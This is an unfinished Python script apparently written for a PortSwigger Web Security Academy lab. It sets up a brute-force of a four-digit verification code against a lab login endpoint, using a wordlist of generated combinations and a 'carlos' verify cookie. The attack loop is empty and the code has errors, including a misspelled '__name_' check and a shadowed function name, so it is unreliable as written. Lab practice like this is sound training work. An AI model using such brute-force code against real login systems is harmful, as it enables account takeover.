import sys
import requests
import urllib3
from itertools import product # thisis python inbuilt module for combinations

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

output_file = "password.txt"
# digits = "0123456789"

# with open(output_file,"w", encoding= "utf-8") as f:
#     for combo in product(digits, repeat=4):               #product only return tuples ex : (1,2,3,4)
#         f.write("".join(combo) + "\n")          
def username(output_file):
    username = []
    with open(output_file,"r") as f:
        for i in f:
            i = i.strip()
            if i:
                username.append(i)
    return username

def main():
    url = 'https://0ab100fb0332774dc02726db00f20057.web-security-academy.net/login2'
    cookie = { "verify":"carlos" }
    username = username(output_file)
    for user in username:

        

if __name_  == "__main__":
    main()

